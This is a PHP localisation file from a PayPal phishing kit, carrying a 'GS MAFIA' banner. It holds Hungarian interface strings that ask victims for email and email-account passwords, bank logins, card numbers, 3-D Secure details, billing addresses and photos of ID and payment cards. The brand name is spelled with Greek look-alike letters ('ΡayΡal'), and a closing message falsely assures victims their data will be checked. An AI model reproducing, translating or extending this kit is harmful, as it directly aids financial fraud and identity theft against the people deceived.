<?Php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
$gs_string1 = "Email";
$gs_string2 = "Következő";
$gs_string3 = "Problémái vannak a bejelentkezéshez?";
$gs_string4 = "vagy";
$gs_string5 = "Regisztráció";
$gs_string6 = "Kapcsolatfelvétel";
$gs_string7 = "Adatvédelem";
$gs_string8 = "Jogi";
$gs_string9 = "Világszerte";
$gs_string10 = "Módosítás";
$gs_string11 = "Bejelentkezés";
$gs_string12 = "A biztonság a mi elsődleges fontosságú";
$gs_string13 = "A számlázási cím frissítése";
$gs_string14 = "Keresztnév";
$gs_string15 = "Utónév";
$gs_string16 = "Utca címe";
$gs_string17 = "Város";
$gs_string18 = "zip-kód";
$gs_string19 = "Folytatás";
$gs_string20 = "Visszajelzés";
$gs_string21 = "A kártyaadatok frissítése";
$gs_string22 = "Kártyabirtokos neve";
$gs_string23 = "Hónap";
$gs_string24 = "Év";
$gs_string25 = "3-D biztonságos ellenőrzés";
$gs_string26 = "Az e-mail hozzáférés frissítése";
$gs_string27 = "E-mail cím";
$gs_string28 = "E-mail cím jelszó";
$gs_string29 = "csatolja személyi igazolványának másolatát";
$gs_string30 = "A kártya képének csatolása (hátsó / elülső oldal)";
$gs_string31 = "Befejezés";
$gs_string32 = "Jelszó";
$gs_string33 = "Kártyaadatok";
$gs_string34 = "kártya száma";
$gs_string35 = "Ország";
$gs_string36 = "Gratulálok";
$gs_string37 = "<center> A benyújtott fiókadatokat személyzetünk ellenőrzi. <br> <br> Időközben hozzáférést kap fiókjához egy megerősített biztonsággal. <br> <br> <b> Köszönjük, hogy választotta ΡayΡal. </ B> <br> <br> <center> <br> <b> Ön át lesz irányítva, hogy bejelentkezzen fiókjába ΡayΡal ... </ b> <br> <br> ";
$gs_string38 = "Számlaellenőrzés - Biztonsági központ";
$gs_string39 = "Jelentkezz be PayPal-fiókodba";
$gs_string40 = "Számlaellenőrzés - Biztonsági központ";
$gs_stringbk26 = "Bank bejelentkezésének frissítése";
$gs_stringbk27 = "Felhasználó bejelentkezés";
$gs_stringbk28 = "Login Password";
$gs_stringbk29 = "banknév";
$gs_idsub = "Kérjük, erősítse meg személyazonosságát";
$gs_idsub2 = "Az Ön személyi igazolványának fotója (a vezetői engedély vagy a személyi igazolvány mindkét oldala) a fizetési kártya elülső oldalánál.";
?>